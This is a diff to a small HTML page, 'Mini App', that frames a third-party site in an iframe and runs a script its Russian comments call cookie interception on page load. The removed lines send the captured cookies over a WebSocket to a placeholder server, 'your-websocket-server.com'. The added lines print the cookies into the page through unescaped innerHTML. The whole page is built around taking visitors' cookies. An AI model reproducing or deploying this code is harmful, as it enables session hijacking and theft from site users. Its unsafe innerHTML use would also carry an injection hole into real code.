@@ -9,26 +9,21 @@
     <h1>Welcome to Mini App</h1>
     <iframe id="targetSite" src="https://target-website.com" style="width: 100%; height: 100vh;"></iframe>
 
+    <div id="cookiesDisplay" style="margin-top: 20px;"></div>
+
     <script>
         // Функция для перехвата куки
         function captureCookies() {
             const cookies = document.cookie;
             console.log('Cookies:', cookies);
-            // Отправка куки через WebSocket
-            sendCookiesViaWebSocket(cookies);
+            // Вывод куки на экран
+            displayCookies(cookies);
         }
 
-        // Функция для отправки куки через WebSocket
-        function sendCookiesViaWebSocket(cookies) {
-            const socket = new WebSocket('ws://your-websocket-server.com');
-
-            socket.onopen = function(event) {
-                socket.send(JSON.stringify({ cookies: cookies }));
-            };
-
-            socket.onmessage = function(event) {
-                console.log('Received message from server:', event.data);
-            };
+        // Функция для вывода куки на экран
+        function displayCookies(cookies) {
+            const cookiesDisplay = document.getElementById('cookiesDisplay');
+            cookiesDisplay.innerHTML = `<p>Cookies: ${cookies}</p>`;
         }
 
         // Перехват куки при загрузке страницы
